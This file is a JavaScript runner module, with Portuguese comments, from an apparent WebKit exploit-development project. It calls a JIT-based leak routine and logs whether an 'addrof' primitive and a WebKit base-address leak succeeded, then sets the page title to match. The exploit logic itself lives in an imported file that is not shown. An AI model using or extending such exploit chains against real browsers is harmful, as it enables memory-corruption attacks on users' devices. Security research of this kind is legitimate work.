// js/script3/runAllAdvancedTestsS3.mjs (ATUALIZADO para Revisado 44 - JIT Leak)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeAdvancedJITLeak_R44,
    FNAME_MODULE_ADVANCED_JIT_LEAK_R44
} from './testArrayBufferVictimCrash.mjs';

// ALTERADO: A estratégia antiga foi substituída pela nova, baseada em JIT.
async function runAdvancedJITStrategy_R44() {
    const FNAME_RUNNER = "runAdvancedJITStrategy_R44";
    logS3(`==== INICIANDO Estratégia Avançada de JIT Leak (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    const result = await executeAdvancedJITLeak_R44();

    const module_name_for_title = FNAME_MODULE_ADVANCED_JIT_LEAK_R44;

    if (result.errorOccurred) {
        logS3(`  RUNNER R44(JIT): Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        logS3(`  RUNNER R44(JIT): Completou.`, "good", FNAME_RUNNER);

        const addrofResult = result.addrof_result;
        const webkitLeakResult = result.webkit_leak_result;

        if (addrofResult) {
            logS3(`  RUNNER R44(JIT): Teste Addrof: ${addrofResult.msg} (Endereço vazado: ${addrofResult.leaked_object_addr || 'N/A'})`, addrofResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            logS3(`  RUNNER R44(JIT): Teste Addrof não produziu resultado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult) {
            logS3(`  RUNNER R44(JIT): Teste WebKit Base Leak: ${webkitLeakResult.msg} (Base Candidata: ${webkitLeakResult.webkit_base_candidate || 'N/A'})`, webkitLeakResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            logS3(`  RUNNER R44(JIT): Teste WebKit Base Leak não produziu resultado.`, "warn", FNAME_RUNNER);
        }

        // NOVO: Lógica de título simplificada para o novo fluxo.
        if (webkitLeakResult?.success) {
            document.title = `${module_name_for_title}: WebKitLeak SUCCESS!`;
        } else if (addrofResult?.success) {
            document.title = `${module_name_for_title}: Addrof OK, WebKitLeak Fail`;
        } else {
            document.title = `${module_name_for_title}: Addrof/WebKitLeak Fail`;
        }

    } else {
        document.title = `${module_name_for_title}: Invalid Result Obj`;
    }
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia Avançada de JIT Leak (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_ADVANCED_JIT_LEAK_R44}_MainOrchestrator`;
    logS3(`==== INICIANDO Script 3 R44(JIT) (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    // ALTERADO: Chama a nova função runner.
    await runAdvancedJITStrategy_R44();
    logS3(`\n==== Script 3 R44(JIT) (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;
    if (document.title.includes(FNAME_MODULE_ADVANCED_JIT_LEAK_R44) && !document.title.includes("SUCCESS") && !document.title.includes("Fail")) {
        document.title = `${FNAME_MODULE_ADVANCED_JIT_LEAK_R44} Done`;
    }
}
